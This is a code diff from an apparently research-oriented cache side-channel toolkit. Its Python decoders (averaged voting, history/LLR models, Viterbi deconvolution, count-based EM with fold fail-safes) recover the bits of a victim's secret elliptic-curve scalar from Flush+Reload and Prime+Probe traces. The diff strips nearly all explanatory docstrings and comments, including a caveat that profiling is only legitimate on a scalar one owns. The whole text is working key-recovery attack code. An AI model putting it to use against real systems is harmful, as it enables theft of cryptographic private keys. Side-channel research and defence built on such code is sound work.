-        0-bit, is what the vote thresholds: a hard per-trace label saturates
-        (~20 bits wrong however many traces are added) because it throws away
-        how strongly the marker fired, while the averaged count keeps
-        separating -- 18 wrong at 20 traces, 9 at 50, 0-4 at ~190."""
+    def mean_score(self, kept):
         s = np.atleast_2d(self.scores)[kept]
         with np.errstate(invalid="ignore"):
             return np.nanmean(s, axis=0)
 
     def vote(self, kept, lo=None, hi=None):
-        """Fixed-band vote on the mean scaled marker count.
-
-        Superseded by vote_history for ordinary scalars, but NOT redundant: it
-        is the only decoder that works on a CONSTANT scalar. The history model
-        anchors on the 0-bit cluster, so an all-ones scalar (no 0-bits at all)
-        gives zero_cluster no mode to find and vote_history cannot run -- it
-        falls back here. Measured: removing this path took ones/zeros from
-        100%/97.2% known to 100% UNKNOWN while leaving the random scalars
-        untouched."""
         lo = band_lo if lo is None else lo
         hi = band_hi if hi is None else hi
-        r0 = self._mean_score(kept)
+        r0 = self.mean_score(kept)
         pred = []
         known = correct = unknown = 0
         for i in range(self.secret_key_bits):
@@ -1152,12 +736,7 @@ class EC_KEY:
 
 
     @staticmethod
-    def _history_labels(f, margin):
-        """One averaged score vector -> labels + the fitted model.
-
-        Alternates fitting the contamination model on the current labels with
-        relabelling by likelihood ratio, seeded from the self-located 0-cluster.
-        Uses no knowledge of the key."""
+    def history_labels(f, margin):
         a, sd_a = zero_cluster(f)
         if a is None:
             return None, None
@@ -1192,38 +771,21 @@ class EC_KEY:
         return lab, (shape, a, sd_a, sd_1)
 
     def vote_history(self, kept, margin=None, folds=None):
-        """Default decode. Returns the same (pred, stats) pair as vote(), plus
-        the fitted parameters in stats["model"].
-
-        `folds` > 1 is the fail-safe: decode that many disjoint trace subsets
-        separately and report only bits every subset AND the full decode agree
-        on. Needed because the LLR is NOT a confidence measure -- it is
-        dominated by sd_a, which stays ~0.02 even when the two populations
-        genuinely overlap, so a bad capture yields confident WRONG bits rather
-        than unknowns. Over 22 captures: no folds -> 150 wrong on the degraded
-        ones; folds=3 -> every good capture 0 wrong. Raise to 5 on a capture
-        that still decodes with wrong bits, but it costs known bits and not
-        uniformly -- on one capture it took alt from 91% to 48% known and
-        corrected nothing."""
         margin = llr_margin if margin is None else margin
         folds = llr_folds if folds is None else folds
         n = self.secret_key_bits
-        f = self._mean_score(kept)
-        pred, model = self._history_labels(f, margin)
+        f = self.mean_score(kept)
+        pred, model = self.history_labels(f, margin)
         if pred is None:
             return self.vote(kept)
 
-        # Folding needs enough traces per subset to fit the model at all, so it
-        # is skipped on a thin capture -- report the EFFECTIVE count, because a
-        # header claiming folds that never ran hides the one safeguard that
-        # would have turned a bad fit's confident wrong bits into unknowns.
         eff_folds = folds if folds > 1 and len(kept) >= 4 * folds else 1
         if eff_folds > 1:
             s = np.atleast_2d(self.scores)[kept]
             for k in range(folds):
                 with np.errstate(invalid="ignore"):
                     sub = np.nanmean(s[k::folds], axis=0)
-                lab, _ = self._history_labels(sub, margin)
+                lab, _ = self.history_labels(sub, margin)
                 if lab is None:
                     continue
                 pred = [p if p == q and p != "u" else "u"
@@ -1253,14 +815,7 @@ class EC_KEY:
                       round(A, 3), round(sd_a, 4), round(float(sd_1), 3)),
         }
 
-    def _matched_labels(self, f, taps, margin, kernel):
-        """One averaged score vector -> (labels, (c, h, sd)) or (None, None).
-
-        Pulled out of vote_matched so the SAME fit can run on a disjoint trace
-        subset for the fold fail-safe below -- exactly what _history_labels and
-        _counts_labels do for their decoders. Fits (or applies) the kernel,
-        runs the Viterbi deconvolution, and turns per-bit posteriors into
-        labels at `margin`; does not touch self.* or compute known/wrong."""
+    def matched_labels(self, f, taps, margin, kernel):
         n = len(f)
         fin = np.isfinite(f)
         if fin.sum() < 8 * taps:
@@ -1270,10 +825,6 @@ class EC_KEY:
         if kernel is not None:
             c, h = kernel
         else:
-            # Blind seed: the marker fires on `marker_value` bits, so the
-            # highest slots are the likeliest to be one -- but shifted by the
-            # response lag, which is exactly what we do not know yet. Seeding
-            # from a plain threshold is enough for the alternation to lock on.
             z = (g >= np.median(g)).astype(float)
             c, h = None, None
             for _ in range(ps_fit_rounds):
@@ -1304,48 +855,12 @@ class EC_KEY:
         return pred, (c, h, sd)
 
     def vote_matched(self, kept, taps=None, margin=None, kernel=None, folds=None):
-        """P+S decode: matched filter over the SMEARED, LAGGED response.
-
-        F+R and P+S need different decoders because their impulse responses
-        differ in shape, not just in strength. Cross-correlating the per-slot
-        marker rate against the true bits gives, at lags 0..4:
-
-            F+R   h = [2.32, 0.42, 0.51, 0.21, 0.37]   sharp, peaks at LAG 0
-            P+S   h = [0.17, 0.40, 0.22, 0.17, 0.09]   smeared, peaks at LAG 1
-
-        A P+S detection is reported about a whole bit period LATE and spread
-        over ~3 more, because a detection costs a re-prime during which that
-        line is blind. So `vote`/`vote_history`, which read slot i as bit i,
-        read each bit off its NEIGHBOUR -- which is why P+S decodes at chance
-        (0.50 per trace) however good the channel is. Its per-bit contrast is
-        actually BETTER than F+R's (40x vs 9x); only the timing is wrong.
-
-        Model: f[i] = c + sum_k h[k]*z[i-k], z[i]=1 when bit i fires the marker.
-        That is a linear convolution, so the decode is a deconvolution: Viterbi
-        over a state of the last K bits, then forward-backward posteriors to say
-        which bits are actually resolved. Bits below `margin` posterior are left
-        unknown rather than guessed, matching the other decoders' contract.
-
-        `kernel` is (c, h) profiled elsewhere -- the shape is a property of the
-        primitive and the machine, not of the key, so it transfers. Without one
-        the kernel is fitted blind, by alternating fit and Viterbi from a
-        threshold seed.
-
-        `folds` is the SAME fail-safe vote_history and vote_counts already
-        have, and this decoder was the one of the three missing it. The
-        posterior above is exactly as self-referential as their LLR: the blind
-        path fits the kernel to its own hard labels and reads the noise sd off
-        its own residuals, so it is not a calibrated confidence either --
-        measured on ps_k7_r00100, the no-fold decode reported posterior>=0.99
-        on 24 bits and was wrong on 6 of them. Fitting the same model on 3
-        disjoint trace subsets and keeping a bit only where every subset
-        agrees with the full decode cut that to 4 wrong (15 known)."""
         taps = history_taps + 1 if taps is None else taps
         margin = ps_posterior if margin is None else margin
         folds = llr_folds if folds is None else folds
         n = self.secret_key_bits
-        f = self._mean_score(kept)
-        pred, model = self._matched_labels(f, taps, margin, kernel)
+        f = self.mean_score(kept)
+        pred, model = self.matched_labels(f, taps, margin, kernel)
         if pred is None:
             return self.vote(kept)
 
@@ -1355,14 +870,14 @@ class EC_KEY:
             for k in range(folds):
                 with np.errstate(invalid="ignore"):
                     sub = np.nanmean(s[k::folds], axis=0)
-                lab, _ = self._matched_labels(sub, taps, margin, kernel)
+                lab, _ = self.matched_labels(sub, taps, margin, kernel)
                 if lab is None:
                     continue
                 pred = [p if p == q and p != "u" else "u"
                         for p, q in zip(pred, lab)]
 
         pred = list(pred)
-        pred[n - 1] = "u"   # last slot has no following burst to bound it
+        pred[n - 1] = "u"
         c, h, sd = model
 
         known = correct = unknown = 0
@@ -1386,27 +901,12 @@ class EC_KEY:
                       "profiled" if kernel is not None else "blind"),
         }
 
-    def _counts_labels(self, K, margin):
-        """K (traces x >=nbits counts) -> (labels, emis) or (None, None).
-
-        The EM + memory-1 Viterbi fit that used to be inline in vote_counts,
-        pulled out so the SAME fit can run on a disjoint trace subset for the
-        fold fail-safe below -- exactly what _history_labels does for
-        vote_history. K is assumed already rounded and clipped to
-        [0, count_cap]; that step stays in the caller since a fold subset is a
-        row-slice of the same array, not a fresh clip."""
+    def counts_labels(self, K, margin):
         n = self.secret_key_bits
         if K.shape[0] < 4 or K.shape[1] < n:
             return None, None
         Kn = K[:, :n]
 
-        # EM with the latent bit attached to the SLOT, not to each count.
-        # Every trace observes the same slot, so the counts in a column are
-        # conditionally independent draws from that slot's component. Fitting
-        # per observation instead lets EM partition the k values outright --
-        # it returns P(k=3|1-bit)=0.0003 where the truth is 0.163, every slot
-        # then carries several nats, and the decode reports 243 known bits
-        # with 39 of them wrong instead of admitting the overlap.
         col = np.array([np.bincount(Kn[:, i], minlength=count_cap + 1)
                         for i in range(n)], dtype=float)
         w = (Kn.mean(axis=0) >= np.median(Kn)).astype(float)
@@ -1425,27 +925,9 @@ class EC_KEY:
                 break
             w = w_new
 
-        # Memory-0 pass, only to seed the sequence model below.
         llr_tab = np.log(p0) - np.log(p1)
         bits_hat = (llr_tab[Kn].sum(axis=0) > 0).astype(int)
 
-        # The count in a slot depends on the PREVIOUS bit, not just its own:
-        # measured on 1000 traces with the victim's own boundaries,
-        #
-        #     this prev   mean k
-        #        0    0     4.36
-        #        0    1     4.04
-        #        1    0     3.20   <- a 1-bit after a 0-bit reads like a 0-bit
-        #        1    1     0.94
-        #
-        # while conditioning on the NEXT bit changes nothing (1.89 vs 2.13). A
-        # 0-bit's evictions are detected late and spill into the slot after it.
-        # That bias is systematic, so averaging more traces never removes it --
-        # with PERFECT boundaries and 1000 traces a memoryless decode still
-        # leaves ~35 bits wrong, all of them 1-bits that follow a 0-bit. So the
-        # emission is conditioned on the predecessor and the ladder is decoded
-        # as a sequence, which lets a high count be explained either by this
-        # bit or by the one before it.
         for _ in range(count_em_rounds // 6):
             emis = count_emissions(Kn, bits_hat, count_cap, count_prior)
             L = np.zeros((n, 2, 2))
@@ -1464,14 +946,6 @@ class EC_KEY:
                 L[:, b, pb] = emis[b, pb][Kn].sum(axis=0)
         bits_hat, post0 = viterbi_counts(L, posteriors=True)
 
-        # Which Viterbi state is the marker-firing bit is decided by the data,
-        # not by the state numbering: the state whose slots carry more marker
-        # hits is the one the marker fires on. Asserting it the other way round
-        # decodes the whole scalar INVERTED (219 of 245 bits wrong) rather than
-        # failing, which is the mistake this file has now made twice. On a
-        # degenerate fold (one label absent, e.g. a thin subset) there is no
-        # "the other side" to compare against, so the fold is unusable rather
-        # than guessed.
         if len(np.unique(bits_hat)) < 2:
             return None, None
         slot_mean = Kn.mean(axis=0)
@@ -1482,9 +956,6 @@ class EC_KEY:
             [i for i, r in enumerate(self.builtin_lines)
              if r.role in "01"][0]].role
         other = "1" if marker_value == "0" else "0"
-        # `margin` is read as a posterior odds threshold here: a slot is
-        # reported only when the sequence model is that much more sure of one
-        # value than the other.
         conf = np.maximum(post0, 1.0 - post0)
         lim = 1.0 / (1.0 + np.exp(-abs(margin)))
         pred = [(marker_value if b == hi_state else other) if c >= lim else "u"
@@ -1492,58 +963,6 @@ class EC_KEY:
         return pred, emis
 
     def vote_counts(self, kept, margin=None, folds=None):
-        """P+P decode: per-slot marker COUNT likelihood, summed over traces.
-
-        NOT the default any more (see main()'s decoder routing) -- kept for
-        `--counts` and as the count-emission fit vote_history's fold path
-        does not need. It was believed to beat a mean-scaled ratio because a
-        single hard-thresholded slot does, using the SAME single-slot number
-        this docstring used to lead with: best single-slot accuracy under this
-        model is 0.798, against what a fixed ratio threshold reaches with
-        PERFECT boundaries. That comparison never got run at the level that
-        matters -- averaged over many traces AND run through vote_history's
-        fold fail-safe, the two statistics were never actually compared until
-        one was asked for directly. They were, on 2026-08-09, under IDENTICAL
-        oracle boundaries on pp_k0_r00100/pp_k0_r01000: this model 32-34 wrong
-        (241-243 known), vote_history on the SAME self.scores 3-11 wrong
-        (191-208 known). Single-slot accuracy was the wrong thing to have
-        optimized -- see vote_history's docstring for why averaging works
-        despite the overlap below.
-
-        The other decoders reduce each slot to a mean scaled count and
-        threshold it; this model does not, on the theory that P+P's per-slot
-        count is discrete, sub-Poisson and wildly asymmetric so a mean throws
-        signal away. Measured against the oracle over 120 traces:
-
-            k          0       1       2       3       4       5
-            P(k|0)  .0000   .0001   .0008   .1350   .6194   .1955
-            P(k|1)  .2950   .0895   .1832   .1632   .1725   .0749
-            LLR    -12.59   -7.20   -5.43   -0.19   +1.28   +0.96
-
-        A 0-bit yields EXACTLY 4 hits 62% of the time -- P+P catches all four
-        BN.select calls -- while k<=2 is near-proof of a 1-bit. So k=0 carries
-        12.6 nats and k=3 carries 0.19, yet a mean treats them as merely "low"
-        and "lower" -- true, and still not enough to win: vote_history's
-        per-trace ratio is also normalized by that trace's OWN clock count
-        before it is averaged, and this model never looks at the clock at all.
-        Whatever per-trace nuisance the clock would have calibrated out (timer
-        jitter, re-prime overhead) stays baked into every raw count here.
-
-        The two PMFs are fitted blind, by EM over a 2-component mixture on the
-        pooled counts, seeded from a split at the midpoint. Evidence is then
-        accumulated the way independent observations should be -- by SUMMING
-        per-slot log-likelihood ratios across traces, not by averaging counts.
-
-        `folds` mirrors vote_history's fail-safe, and for the same reason: the
-        per-bit posterior above comes from the SAME EM+Viterbi fit it is
-        supposed to be grading, so a fit that is confidently wrong about the
-        overlap looks just as sure of itself as one that is right. Folds
-        re-fits on disjoint trace subsets and keeps a bit only where every
-        subset agrees with the full decode. Unlike vote_history's f (one float
-        per slot, cheap to subset), each fold here re-fits a 13-bin EM AND the
-        memory-1 Viterbi from a THIRD to a fifth of the traces, so whether it
-        earns its cost has to be measured per capture, not assumed from
-        vote_history's numbers."""
         margin = llr_margin if margin is None else margin
         folds = llr_folds if folds is None else folds
         if self.counts is None or not len(kept):
@@ -1554,14 +973,14 @@ class EC_KEY:
         if K.shape[1] < n:
             return self.vote(kept)
 
-        pred, emis = self._counts_labels(K, margin)
+        pred, emis = self.counts_labels(K, margin)
         if pred is None:
             return self.vote(kept)
 
         eff_folds = folds if folds > 1 and len(kept) >= 4 * folds else 1
         if eff_folds > 1:
             for k in range(folds):
-                lab, _ = self._counts_labels(K[k::folds], margin)
+                lab, _ = self.counts_labels(K[k::folds], margin)
                 if lab is None:
                     continue
                 pred = [p if p == q and p != "u" else "u"
@@ -1592,12 +1011,8 @@ class EC_KEY:
         }
 
     def profile_kernel(self, kept, taps=None):
-        """Fit (c, h) against THIS capture's known scalar, for transfer to a
-        capture whose key is unknown. Only legitimate on a scalar you own --
-        that is the point of profiling, and it is why the kernel is fitted here
-        and applied there."""
         taps = history_taps + 1 if taps is None else taps
-        f = self._mean_score(kept)
+        f = self.mean_score(kept)
         fin = np.isfinite(f)
         g = np.where(fin, f, np.nanmedian(f[fin]))
         marker_value = self.builtin_lines[
@@ -1608,25 +1023,11 @@ class EC_KEY:
         return fit_matched_kernel(z, g[:len(z)], taps)
 
     def per_trace_accuracy(self, kept):
-        return [self._agreement(self.infer_keys[i][1], self.secret_key_bin)
+        return [self.agreement(self.infer_keys[i][1], self.secret_key_bin)
                 for i in kept]
 
 
-# ---------------------------------------------------------------------------
-# Real vs inferred comparison
-# ---------------------------------------------------------------------------
-
 def print_key_comparison(true_bits, pred, width=60):
-    """Print the true scalar against the decode, chunked, with a diff row so
-    the wrong/unknown bits are visible at a glance rather than buried in a
-    count. `pred` is exactly len(true_bits) chars over {'0','1','u'} -- every
-    vote_*() returns one bit per position of the secret, never a partial
-    string, so the two always line up index for index.
-
-    Wrong bits are red and marked '^' on the diff row; unknown ('u') bits are
-    dim and marked '.'. Color is only emitted to a real terminal -- the diff
-    row alone already carries the same information in a piped/redirected
-    log, where the ANSI codes would otherwise show up as escape junk."""
     color = sys.stdout.isatty()
     red, dim, rst = ("\033[31;1m", "\033[2m", "\033[0m") if color else ("", "", "")
     legend = ("[red=wrong, dim=unknown]" if color else
@@ -1647,17 +1048,8 @@ def print_key_comparison(true_bits, pred, width=60):
         print(f"          {diff}")
 
 
-# ---------------------------------------------------------------------------
-# Oracle scoring (-bits captures only)
-# ---------------------------------------------------------------------------
-
 def score_oracle(directory, builtin_lines, primitive, key_bits, aligned=None,
                  period=None, offset=0, phase=0.0):
-    """Split a decode's two error sources using victim_bits.txt: how well the
-    burst segmentation reproduces the true bit boundaries, and how well the
-    per-slot ratio test reproduces the true bit given PERFECT boundaries. A
-    decode that is accurate with oracle slots but not with inferred ones is an
-    alignment problem, and vice versa."""
     path = os.path.join(directory, "victim_bits.txt")
     if not os.path.exists(path):
         print("no victim_bits.txt in this capture (re-capture with -bits)")
@@ -1696,9 +1088,6 @@ def score_oracle(directory, builtin_lines, primitive, key_bits, aligned=None,
         lab = np.where(m / np.maximum(c, 1) >= ratio_thresh, "0", "1")
         or_acc.append(float(np.mean([a == b for a, b in zip(lab, truth)])))
 
-        # Segment exactly as the decode did, or the "segmentation ceiling" is
-        # a ceiling on a pipeline nobody ran -- it read 0.627 while the decode
-        # it was supposed to bound achieved 0.760.
         cands, _, _, tightest = decode_candidates(
             cols, builtin_lines, per, None, 1, phase, None, period, offset)
         if cands:
@@ -1727,10 +1116,6 @@ def score_oracle(directory, builtin_lines, primitive, key_bits, aligned=None,
     if key_bits and per != key_bits:
         print(f"  NOTE: oracle says {per} ladder bits, --key implies {key_bits}")
 
-
-# ---------------------------------------------------------------------------
-# Main
-# ---------------------------------------------------------------------------
 
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(
@@ -1881,10 +1266,6 @@ if __name__ == "__main__":
     else:
         pred, st = skey.vote_history(kept, llr_margin, llr_folds)
 
-    # Both model-based decodes fall back to the fixed band when they cannot fit
-    # (a constant scalar has no 0-cluster to anchor on; a thin capture has too
-    # few finite slots to fit a kernel), and the fallback carries no "model" --
-    # so the header is chosen by what came back, not by what was requested.
     if "counts_model" in st:
         e = st["counts_model"]
         nm = ["P(k|0,prev 0)", "P(k|0,prev 1)", "P(k|1,prev 0)", "P(k|1,prev 1)"]
